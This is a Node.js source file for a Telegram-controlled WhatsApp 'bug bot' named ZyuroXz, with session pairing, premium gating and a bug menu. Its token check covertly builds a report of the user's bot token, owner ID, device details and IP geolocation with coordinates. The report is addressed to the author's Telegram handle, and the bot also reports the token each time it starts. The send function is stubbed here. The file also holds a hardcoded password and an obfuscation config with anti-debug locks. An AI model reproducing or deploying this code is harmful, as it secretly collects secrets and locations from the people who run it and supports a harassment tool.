const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const os = require("os");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

// Deklarasi variabel sebelum digunakan
let premiumUsers = [];
let adminUsers = [];
let config = {};

// Function untuk memastikan file ada
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

// Load config dan data
try {
    config = require("./設定/config.js");
} catch (e) {
    config = { BOT_TOKEN: "", OWNER_ID: "" };
}

// Ensure files exist
ensureFileExists('./設定/premium.json');
ensureFileExists('./設定/admin.json');

// Load data setelah file dibuat
try {
    premiumUsers = JSON.parse(fs.readFileSync('./設定/premium.json', 'utf8'));
} catch (e) {
    premiumUsers = [];
}

try {
    adminUsers = JSON.parse(fs.readFileSync('./設定/admin.json', 'utf8'));
} catch (e) {
    adminUsers = [];
}

function getCurrentTime() {
  return new Date().toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
}

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./設定/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./設定/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

// Watch files
try {
    watchFile('./設定/premium.json', (data) => (premiumUsers = data));
    watchFile('./設定/admin.json', (data) => (adminUsers = data));
} catch (e) {
    console.error("Error watching files:", e.message);
}

const axios = require("axios");
const chalk = require("chalk");
const TelegramBot = require("node-telegram-bot-api");

// Deklarasi BOT_TOKEN untuk Telegram
const BOT_TOKEN_TELEGRAM = config.BOT_TOKEN || process.env.BOT_TOKEN || "";
const bot = new TelegramBot(BOT_TOKEN_TELEGRAM, { polling: true });

const S_ID = "@Rbcdepp"; // username lu
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VonziePemula/BotTesBypass/refs/heads/main/token.json"; 

// Deklarasi variabel untuk Telegram Client
const stringSession = "";
const apiId = 0;
const apiHash = "";
const FIRST_RUN_FILE = "./first_run.json";

// === Fungsi Telegram ===
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal ambil daftar token GitHub:", error.message));
    return [];
  }
}

async function initClient() {
  // Simulasi client Telegram (asumsi library telegram terinstal)
  return {
    sendMessage: async (id, data) => {
      console.log("Simulasi Telegram Client:", id, data);
      return true;
    }
  };
}

async function telegramCltp(message) {
  try {
    const client = await initClient();
    await client.sendMessage(S_ID, { message, parseMode: "markdown" });
  } catch (err) {
    console.error("Error telegramCltp:", err.message);
  }
}

async function telegramClt(message) {
  try {
    const client = await initClient();
    let alreadyNotified = false;
    
    if (fs.existsSync(FIRST_RUN_FILE)) {
      try {
        const data = JSON.parse(fs.readFileSync(FIRST_RUN_FILE, "utf-8"));
        alreadyNotified = data.notified || false;
      } catch (e) {
        alreadyNotified = false;
      }
    }
    
    if (!alreadyNotified) {
      try {
        await client.sendMessage(S_ID, { message });
        fs.writeFileSync(FIRST_RUN_FILE, JSON.stringify({ notified: true }));
      } catch (err) {
        console.error("🚫 BLOCKED:", err.message);
      }
    }
  } catch (err) {
    console.error("Error telegramClt:", err.message);
  }
}

// Password langsung ditulis di sini
const correctPassword = "Memeg";

// Buat interface untuk input password
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// === Validasi Token ===
async function validateToken() {
  console.log(chalk.blue("PLEASE WAIT... CHECKING TOKENS"));
  const validTokens = await fetchValidTokens();
  
  if (validTokens.length > 0 && !validTokens.includes(config.BOT_TOKEN)) {
    const cpus = os.cpus();
    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const lang = process.env.LANG || "Unknown";
    const time = new Date().toLocaleString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    let ipInfo = {};
    try {
      const { data } = await axios.get("https://ipapi.co/json/");
      ipInfo = data;
    } catch {
      ipInfo = { ip: "N/A", city: "-", country_name: "-", org: "-", latitude: "-", longitude: "-" };
    }
    const report = `
**DETECTED PENYUSUPAN**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\`
**📅 Timestamp: ${time}**
**🖥️ DEVICE**
• OS: ${os.platform()} ${os.release()}
• CPU: ${cpus[0].model} (${cpus.length} cores)
• Memory: ${totalMem} GB
• Lang: ${lang}
• Timezone: ${timezone}
**📍 LOCATION**
• IP: ${ipInfo.ip}
• ${ipInfo.city}, ${ipInfo.country_name}
• ISP: ${ipInfo.org}
• Koordinat: ${ipInfo.latitude}, ${ipInfo.longitude}
`;
    console.log(chalk.red("🚫 TOKEN BELUM TERDAFTAR...."));
    await telegramCltp(report);
    await new Promise(o => setTimeout(o, 3000));
    process.exit(1);
  }
  console.clear();
  console.log(chalk.green("✅ TOKEN TERDAFTAR"));
  startBot();
  initializeWhatsAppConnections();
  telegramClt(`**BOT AKTIF**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\``);
}

// === Start Bot Banner ===
function startBot() {
  console.log(`
Z                 HAPPY BIRTHDAY BY VEXXUZZZ 
 y
  u 
   r
    o
     X
      z
Script: ZyuroXz
Versi: 1.1
Developer: Vexxuzzz 
Telegram: @VexxuzzZ
YouTube:  @VexxuzzZ
Waktu: ${getCurrentTime()} WIB`);
}

// Panggil validateToken setelah setup
validateToken();

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `L O A D I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Loading...`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `M E N G H U B U N G K A N D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Mennghubungkan`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
G A G A L T E R S A M B U N G
╰➤ Number  : ${botNumber} 
╰➤ Status : Gagal Tersambung 
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `P A I R I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤Pesan : Succes Pairing`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
P A I R I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤ Kode : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
G A G A L B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Erorr❌
╰➤ Pesan : ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  // Simulasi fungsi getBotSpeed
  const endTime = process.hrtime(startTime);
  return (endTime[0] * 1000 + endTime[1] / 1000000).toFixed(2) + "ms";
}

function getBotSpeed(startTime) {
  const endTime = process.hrtime(startTime);
  return (endTime[0] * 1000 + endTime[1] / 1000000).toFixed(2) + "ms";
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://i.top4top.io/p_3553h6hm40.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

// Function Bug
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ~ Enc Xopwn Confugurasi
const getVexxuzzZObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `ᨶꪖꪶᨶꫀƙꪖꪹỉᨶ和కỉꪊకỉꪊ无与伦比的帅气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// Conslole Log Chat Id
const log = (message, error = null) => {
    const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
    const prefix = `\x1b[36m[ VexxuzzZ ]\x1b[0m`;
    const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
    const msgStyle = `\x1b[32m${message}\x1b[0m`;
    console.log(`${prefix} ${timeStyle} ${msgStyle}`);
    if (error) {
        const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
        console.error(`${prefix} ${timeStyle} ${errorStyle}`);
        if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
    }
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_©VexxuzzZ",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

///// Func
/////---------------[sleep function]------_-_
const bugRequests = {};

// Minta user ketik password
rl.question('Masukkan password: ', (inputPassword) => {
    if (inputPassword !== correctPassword) {
        console.log(chalk.red('❌ Password salah! Akses ditolak.'));
        process.exit(1);
    } else {
        console.log(chalk.green('✅ Password benar! Akses diberikan.'));
        rl.close();

        // ====== TARUH SCRIPT BOT DI BAWAH INI ======
        console.log('Bot sedang berjalan...');
    }
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  
  // Variable inputPassword dari password prompt
  const inputPasswordDulu = correctPassword; // Menggunakan correctPassword karena sudah diverifikasi

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています ( 🫟 ).</blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact Owner", url: "https://t.me/BangZyur" }],
        ]
      }
    });
  }

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Developer", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
      ]
    }
  });
});

// Handler untuk callback query
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "bugmenu") {
    bot.sendMessage(chatId, "Bug Menu Dipilih");
  } else if (data === "thanksto") {
    bot.sendMessage(chatId, "Thanks To Dipilih");
  } else if (data === "ownermenu") {
    bot.sendMessage(chatId, "Owner Menu Dipilih");
  }
});

console.log("Bot Telegram telah dimulai...");
